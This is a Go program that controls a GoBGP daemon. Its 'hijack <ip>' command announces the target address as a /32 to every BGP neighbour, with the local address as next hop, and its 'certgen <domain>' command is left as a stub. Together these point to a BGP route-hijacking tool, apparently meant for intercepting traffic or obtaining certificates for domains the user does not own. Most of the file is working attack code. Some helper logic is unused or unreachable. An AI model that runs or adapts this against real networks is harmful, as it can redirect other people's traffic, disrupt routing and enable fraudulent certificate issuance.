package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"net/http"
	"encoding/json"
	"strconv"
	"strings"

	api "github.com/osrg/gobgp/v3/api"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/anypb"
)

const (
	grpcPort = 50051
)

type RipeResponse struct {
	Data struct {
		Resource string `json:"resource"`
	} `json:"data"`
}

type Community struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type Config struct {
	Community string `json:"community"`
}

var config Config

func getCurrentPrefixLengthFromRipe(ip string) (uint32, error) {
	// Construct the API URL
	url := fmt.Sprintf("https://stat.ripe.net/data/prefix-overview/data.json?resource=%s", ip)

	// Make the HTTP request
	resp, err := http.Get(url)
	if err != nil {
		return 0, fmt.Errorf("failed to call RIPE API: %v", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("RIPE API returned non-200 status: %d", resp.StatusCode)
	}

	// Parse the JSON response
	var ripeResp RipeResponse
	if err := json.NewDecoder(resp.Body).Decode(&ripeResp); err != nil {
		return 0, fmt.Errorf("failed to parse RIPE API response: %v", err)
	}

	// Extract prefix length from the resource string (e.g., "103.147.22.0/24" -> 24)
	parts := strings.Split(ripeResp.Data.Resource, "/")
	if len(parts) != 2 {
		return 0, fmt.Errorf("invalid resource format: %s", ripeResp.Data.Resource)
	}

	prefixLen, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil {
		return 0, fmt.Errorf("invalid prefix length: %s", parts[1])
	}

	return uint32(prefixLen), nil
}

func loadConfig() error {
	file, err := os.ReadFile("config.json")
	if err != nil {
		return fmt.Errorf("failed to read config file: %v", err)
	}

	if err := json.Unmarshal(file, &config); err != nil {
		return fmt.Errorf("failed to parse config file: %v", err)
	}

	return nil
}

func createCommunityAttributes() ([]*anypb.Any, error) {
	var attrs []*anypb.Any

	// Split the community value into parts
	parts := strings.Split(config.Community, ":")
	
	// Check if it starts with "large:" prefix
	if len(parts) > 0 && parts[0] == "large" {
		// Remove the "large:" prefix and process as large community
		parts = parts[1:]
		if len(parts) != 3 {
			return nil, fmt.Errorf("invalid large community format: %s", config.Community)
		}

		globalAdmin, err := strconv.ParseUint(parts[0], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid global admin in large community: %s", parts[0])
		}

		localData1, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid local data 1 in large community: %s", parts[1])
		}

		localData2, err := strconv.ParseUint(parts[2], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid local data 2 in large community: %s", parts[2])
		}

		// Create the large community attribute
		largeCommunity := &api.LargeCommunitiesAttribute{
			Communities: []*api.LargeCommunity{
				{
					GlobalAdmin: uint32(globalAdmin),
					LocalData1:  uint32(localData1),
					LocalData2:  uint32(localData2),
				},
			},
		}
		largeCommunityAttr, err := anypb.New(largeCommunity)
		if err != nil {
			return nil, fmt.Errorf("failed to create large community attribute: %v", err)
		}
		attrs = append(attrs, largeCommunityAttr)
	} else if len(parts) == 2 {
		// Process as standard community
		as, err := strconv.ParseUint(parts[0], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid AS number in standard community: %s", parts[0])
		}

		value, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid value in standard community: %s", parts[1])
		}

		// Create the standard community attribute
		community := &api.CommunitiesAttribute{
			Communities: []uint32{uint32(as<<16 | value)},
		}
		communityAttr, err := anypb.New(community)
		if err != nil {
			return nil, fmt.Errorf("failed to create standard community attribute: %v", err)
		}
		attrs = append(attrs, communityAttr)
	} else {
		return nil, fmt.Errorf("invalid community format: %s", config.Community)
	}

	return attrs, nil
}

func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string) error {
	// Create NLRI
	nlri, err := anypb.New(&api.IPAddressPrefix{
		Prefix:    prefix,
		PrefixLen: prefixLen,
	})
	if err != nil {
		return fmt.Errorf("failed to create NLRI: %v", err)
	}

	// Create next-hop attribute
	nextHopAttr, err := anypb.New(&api.NextHopAttribute{
		NextHop: nextHop,
	})
	if err != nil {
		return fmt.Errorf("failed to create next-hop attribute: %v", err)
	}

	// Create origin attribute (IGP)
	origin, err := anypb.New(&api.OriginAttribute{
		Origin: 0, // 0 = IGP, 1 = EGP, 2 = INCOMPLETE
	})
	if err != nil {
		return fmt.Errorf("failed to create origin attribute: %v", err)
	}

	// Create community attributes (both standard and large)
	communityAttrs, err := createCommunityAttributes()
	if err != nil {
		return fmt.Errorf("failed to create community attributes: %v", err)
	}

	// Combine all path attributes
	pattrs := []*anypb.Any{origin, nextHopAttr}
	pattrs = append(pattrs, communityAttrs...)

	path := &api.Path{
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
		Nlri:   nlri,
		Pattrs: pattrs,
	}

	_, err = client.AddPath(ctx, &api.AddPathRequest{
		Path: path,
	})
	if err != nil {
		return fmt.Errorf("failed to add path: %v", err)
	}

	return nil
}

func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
	// List all routes first
	stream, err := client.ListPath(ctx, &api.ListPathRequest{
		TableType: api.TableType_GLOBAL,
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
	})
	if err != nil {
		return fmt.Errorf("failed to list routes: %v", err)
	}

	// Process each route
	for {
		response, err := stream.Recv()
		if err != nil {
			break // End of stream
		}

		// Delete each route individually
		_, err = client.DeletePath(ctx, &api.DeletePathRequest{
			Path: response.Destination.Paths[0],
		})
		if err != nil {
			return fmt.Errorf("failed to delete route %s: %v", response.Destination.Prefix, err)
		}
		fmt.Printf("Deleted route: %s\n", response.Destination.Prefix)
	}

	fmt.Println("All routes cleared successfully")
	return nil
}

func determinePrefixLength(ip string) (uint32, error) {
	// Check if it's an IPv4 address
	return 32, nil
	return 0, fmt.Errorf("invalid IP address format: %s", ip)
}

func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, prefixLenOverride ...uint32) error {
	// Using automatic prefix length determination
	// hijackRoutes(client, ctx, "192.168.1.0")
	// Using a specific prefix length
	// hijackRoutes(client, ctx, "192.168.1.0", 16)
	
	// Get BGP neighbors
	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
	if err != nil {
		return fmt.Errorf("failed to get neighbors: %v", err)
	}

	// Determine prefix length for the target IP
	var prefixLen uint32
	var err2 error
	if len(prefixLenOverride) > 0 {
		prefixLen = prefixLenOverride[0]
	} else {
		prefixLen, err2 = determinePrefixLength(ip)
		if err2 != nil {
			return fmt.Errorf("failed to determine prefix length: %v", err2)
		}
	}

	fmt.Println("BGP Neighbors:")
	for {
		peer, err := stream.Recv()
		if err != nil {
			break
		}
		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
			peer.Peer.Conf.NeighborAddress,
			peer.Peer.Conf.PeerAsn,
			peer.Peer.State.SessionState)

		// Add a new route using our local address as next-hop
		// Add no-export community by default
		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress)
		if err != nil {
			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
		}

		fmt.Printf("Route added successfully to %s (prefix length: /%d)\n", 
			peer.Peer.Conf.NeighborAddress, prefixLen)
	}
	return nil
}

func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string) error {
	// TODO: Implement certificate generation logic
	fmt.Printf("Generating certificate for domain: %s\n", domain)
	return nil
}

func main() {
	// Load configuration
	if err := loadConfig(); err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	if len(os.Args) < 2 {
		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip>  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
	}

	// Connect to GoBGP daemon
	conn, err := grpc.Dial(fmt.Sprintf("localhost:%d", grpcPort),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to connect to GoBGP: %v", err)
	}
	defer conn.Close()

	client := api.NewGobgpApiClient(conn)
	ctx := context.Background()

	switch os.Args[1] {
	case "clear":
		if err := clearRoutes(client, ctx); err != nil {
			log.Fatalf("Failed to clear routes: %v", err)
		}
		fmt.Println("Route cleared successfully")

	case "hijack":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go hijack <ip>")
		}
		targetIP := os.Args[2]
		if err := hijackRoutes(client, ctx, targetIP); err != nil {
			log.Fatalf("Failed to hijack routes: %v", err)
		}

	case "certgen":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go certgen <domain>")
		}
		domain := os.Args[2]
		if err := generateCertificate(client, ctx, domain); err != nil {
			log.Fatalf("Failed to generate certificate: %v", err)
		}

	default:
		log.Fatal("Unknown command. Available commands: clear, hijack <ip>, certgen <domain>")
	}
} 